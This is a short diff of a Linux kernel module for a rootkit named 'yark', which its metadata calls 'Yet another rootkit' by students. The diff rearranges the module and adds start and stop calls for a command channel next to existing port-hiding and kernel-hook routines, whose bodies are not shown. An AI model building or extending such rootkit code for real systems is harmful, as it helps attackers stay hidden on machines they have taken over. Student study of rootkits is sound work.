@@ -2,13 +2,8 @@
 #include <linux/module.h>
 #include "hook_helper.h"
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Students from Institute of Information Engineering");
-MODULE_DESCRIPTION("Yet another rootkit.");
-MODULE_VERSION("0.01");
-
-#define MODULE_NAME "yark"
-#define LOG_PREFIX "yark: "
+#include "command.h"
+#include "main.h"
 
 //functions and args bellow are all for hidding ports
 
@@ -34,14 +29,20 @@ static int __init yark_init(void)
 {
     pr_info(LOG_PREFIX "call yark_init()");
     hide_ports();
+    command_start();
     return 0;
 }
 
-static void __exit yark_exit(void)
-{
-    fh_remove_hook(&hook111);
+static void __exit yark_exit(void) {
     pr_info(LOG_PREFIX "call yark_exit()");
+    command_end();
+    fh_remove_hook(&hook111);
 }
 
 module_init(yark_init);
 module_exit(yark_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Students from Institute of Information Engineering");
+MODULE_DESCRIPTION("Yet another rootkit.");
+MODULE_VERSION("0.01");
